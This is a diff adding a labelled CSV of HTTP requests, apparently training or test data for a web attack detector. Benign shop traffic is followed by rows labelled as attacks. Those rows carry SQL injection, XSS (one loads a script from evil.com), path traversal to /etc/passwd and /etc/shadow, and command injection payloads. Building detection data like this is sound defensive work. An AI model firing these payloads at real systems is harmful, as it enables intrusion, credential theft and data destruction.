@@ -1,0 +1,51 @@
+method,path,query,headers,body,source_ip,session_id,user_id,label
+GET,/,,"{}","",192.168.1.10,sess-01,user-01,benign
+GET,/products,page=1&limit=20,"{}","",192.168.1.10,sess-01,user-01,benign
+GET,/products/1,,"{}","",192.168.1.10,sess-01,user-01,benign
+GET,/search,q=wireless+headphones,"{}","",10.0.0.5,sess-02,user-02,benign
+GET,/search,q=mechanical+keyboard,"{}","",10.0.0.5,sess-02,user-02,benign
+POST,/cart/add,,"{""content-type"": ""application/json""}","{""product_id"": 42, ""quantity"": 1}",10.0.0.5,sess-02,user-02,benign
+GET,/cart,,"{}","",10.0.0.5,sess-02,user-02,benign
+POST,/checkout,,"{""content-type"": ""application/json""}","{""payment_method"": ""card"", ""amount"": 199.99}",10.0.0.5,sess-02,user-02,benign
+GET,/dashboard,,"{}","",172.16.0.20,sess-03,user-03,benign
+GET,/analytics/summary,period=month,"{}","",172.16.0.20,sess-03,user-03,benign
+GET,/settings/profile,,"{}","",172.16.0.20,sess-03,user-03,benign
+POST,/settings/profile,,"{""content-type"": ""application/json""}","{""display_name"": ""Alice Smith"", ""theme"": ""dark""}",172.16.0.20,sess-03,user-03,benign
+GET,/docs/api,,"{}","",203.0.113.50,sess-04,user-04,benign
+GET,/health,,"{}","",127.0.0.1,sess-sys,system,benign
+GET,/metrics,,"{}","",127.0.0.1,sess-sys,system,benign
+GET,/support/faq,category=billing,"{}","",192.168.1.15,sess-05,user-05,benign
+GET,/notifications,unread=true,"{}","",192.168.1.15,sess-05,user-05,benign
+POST,/feedback,,"{""content-type"": ""application/json""}","{""rating"": 5, ""comment"": ""Great service!""}",192.168.1.15,sess-05,user-05,benign
+GET,/categories,filter=electronics,"{}","",192.168.1.25,sess-06,user-06,benign
+GET,/products/15/reviews,page=1,"{}","",192.168.1.25,sess-06,user-06,benign
+GET,/account/orders,status=shipped,"{}","",10.0.0.12,sess-07,user-07,benign
+GET,/account/orders/10042,,"{}","",10.0.0.12,sess-07,user-07,benign
+POST,/search/suggest,,"{""content-type"": ""application/json""}","{""prefix"": ""lap""}",192.168.1.50,sess-08,user-08,benign
+GET,/blog/posts,tag=security,"{}","",192.168.1.50,sess-08,user-08,benign
+GET,/blog/posts/cybersecurity-best-practices,,"{}","",192.168.1.50,sess-08,user-08,benign
+GET,/search,q=1 UNION SELECT username,password FROM users--,"{}","",185.220.101.5,sess-atk-01,attacker,sql_injection
+GET,/products/1,id=1' OR '1'='1,"{}","",185.220.101.5,sess-atk-01,attacker,sql_injection
+POST,/login,,"{""content-type"": ""application/json""}","{""username"": ""admin' --"", ""password"": ""x""}",185.220.101.5,sess-atk-01,attacker,sql_injection
+GET,/search,q=1' AND 1=2 UNION SELECT 1,table_name,3 FROM information_schema.tables--,"{}","",185.220.101.5,sess-atk-01,attacker,sql_injection
+POST,/api/v1/orders,,"{""content-type"": ""application/json""}","{""order_id"": ""1; DROP TABLE orders;--""}",185.220.101.5,sess-atk-01,attacker,sql_injection
+GET,/users,search=admin' OR 1=1--,"{}","",194.26.29.11,sess-atk-02,attacker,sql_injection
+GET,/products,category=electronics' UNION ALL SELECT null,concat(email,':',password) FROM accounts--,"{}","",194.26.29.11,sess-atk-02,attacker,sql_injection
+GET,/search,q=test') OR ('a'='a,"{}","",194.26.29.11,sess-atk-02,attacker,sql_injection
+GET,/search,q=1; WAITFOR DELAY '0:0:5'--,"{}","",194.26.29.11,sess-atk-02,attacker,sql_injection
+GET,/profile,user=1' UNION SELECT 1,version(),user()--,"{}","",194.26.29.11,sess-atk-02,attacker,sql_injection
+GET,/search,q=<script>alert(document.domain)</script>,"{}","",45.154.255.8,sess-atk-03,attacker,xss
+POST,/comments,,"{""content-type"": ""application/json""}","{""text"": ""<img src=x onerror=alert(1)>""}",45.154.255.8,sess-atk-03,attacker,xss
+GET,/profile,name=<svg onload=alert(document.cookie)>,"{}","",45.154.255.8,sess-atk-03,attacker,xss
+GET,/search,q=<iframe src=javascript:alert('XSS')>,"{}","",45.154.255.8,sess-atk-03,attacker,xss
+POST,/feedback,,"{""content-type"": ""application/json""}","{""body"": ""<body onload=alert('Pwned')>""}",45.154.255.8,sess-atk-03,attacker,xss
+GET,/support/ticket,subject=<script src='http://evil.com/hook.js'></script>,"{}","",45.154.255.8,sess-atk-03,attacker,xss
+GET,/search,q=%3Cscript%3Ealert(1)%3C%2Fscript%3E,"{}","",45.154.255.8,sess-atk-03,attacker,xss
+POST,/forum/post,,"{""content-type"": ""application/json""}","{""content"": ""<a href='javascript:eval(atob(\""YWxlcnQoMSki\"))'>Click here</a>""}",45.154.255.8,sess-atk-03,attacker,xss
+GET,/products/../../../etc/passwd,,"{}","",193.142.146.3,sess-atk-04,attacker,path_traversal
+GET,/static/images/../../../../windows/win.ini,,"{}","",193.142.146.3,sess-atk-04,attacker,path_traversal
+GET,/download,file=..%2F..%2F..%2Fetc%2Fshadow,"{}","",193.142.146.3,sess-atk-04,attacker,path_traversal
+GET,/export,template=../../../../var/log/nginx/access.log,"{}","",193.142.146.3,sess-atk-04,attacker,path_traversal
+POST,/admin/ping,,"{""content-type"": ""application/json""}","{""host"": ""8.8.8.8; cat /etc/passwd""}",198.51.100.99,sess-atk-05,attacker,command_injection
+POST,/admin/diagnostics,,"{""content-type"": ""application/json""}","{""cmd"": ""| ls -la /root""}",198.51.100.99,sess-atk-05,attacker,command_injection
+GET,/tools/lookup,host=127.0.0.1%20%26%20id,"{}","",198.51.100.99,sess-atk-05,attacker,command_injection
